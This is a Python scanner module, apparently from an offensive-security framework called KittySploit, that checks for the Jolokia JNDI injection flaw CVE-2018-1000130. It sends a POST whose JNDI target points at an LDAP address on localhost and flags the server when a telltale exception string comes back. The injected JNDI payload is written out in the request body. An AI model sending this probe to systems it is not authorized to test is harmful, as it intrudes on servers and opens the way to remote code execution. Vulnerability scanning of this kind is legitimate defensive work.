#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jolokia agent is vulnerable to a JNDI injection vulnerability that allows a remote attacker to run arbitrary J."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jolokia Agent - JNDI Code Injection Detection',
        'description': 'Jolokia agent is vulnerable to a JNDI injection vulnerability that allows a remote attacker to run arbitrary Java code on the server when the agent is in proxy mode.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2018', 'cve', 'jolokia', 'rce', 'jndi', 'proxy', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://jolokia.org/#Security_fixes_with_1.5.0',
            'https://access.redhat.com/errata/RHSA-2018:2669',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-1000130',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/SexyBeast233/SecBooks',
        ],
        'cve': 'CVE-2018-1000130',
    }

    def run(self):
        path = '/jolokia/read/getDiagnosticOptions'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.', 'Content-Type': 'application/x-www-form-urlencoded'}, data='{\n   "type":"read",\n   "mbean":"java.lang:type=Memory",\n   "target":{\n      "url":"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat"\n   }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='Jolokia Agent - JNDI Code Injection detected', path=path)
            return True
        return False

